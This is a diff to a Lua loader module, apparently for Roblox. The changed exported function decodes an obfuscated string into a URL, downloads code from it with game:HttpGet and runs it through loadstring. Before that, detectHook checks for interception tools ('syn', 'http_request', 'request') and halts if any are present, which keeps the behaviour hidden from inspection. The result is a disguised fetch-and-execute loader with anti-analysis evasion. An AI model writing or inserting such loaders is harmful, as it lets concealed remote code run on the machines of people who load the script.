@@ -13,10 +13,10 @@ local MAP = {
 }
 
 local function detectHook()
-    if rawget(getfenv(), "syn") then return true end
-    if rawget(getfenv(), "http_request") then return true end
-    if rawget(getfenv(), "request") then return true end
-    return false
+    local env = getfenv()
+    return rawget(env, "syn")
+        or rawget(env, "http_request")
+        or rawget(env, "request")
 end
 
 local function warnUI()
@@ -30,10 +30,10 @@ local function warnUI()
 end
 
 local function decrypt(s)
-    local out={}
-    for i=1,#s do
-        local c=s:sub(i,i)
-        out[#out+1]=MAP[c] or c
+    local out = {}
+    for i = 1, #s do
+        local c = s:sub(i, i)
+        out[#out + 1] = MAP[c] or c
     end
     return table.concat(out)
 end
@@ -41,10 +41,17 @@ end
 return function(enc)
     if detectHook() then
         warnUI()
-        return nil
+        return
     end
-    local code=decrypt(enc)
-    local func=loadstring(code)
-    if not func then return nil end
-    return pcall(func)
+
+    local url = decrypt(enc)
+    local src = game:HttpGet(url)
+    local func, err = loadstring(src)
+
+    if not func then
+        warn("loadstring error:", err)
+        return
+    end
+
+    return func()
 end
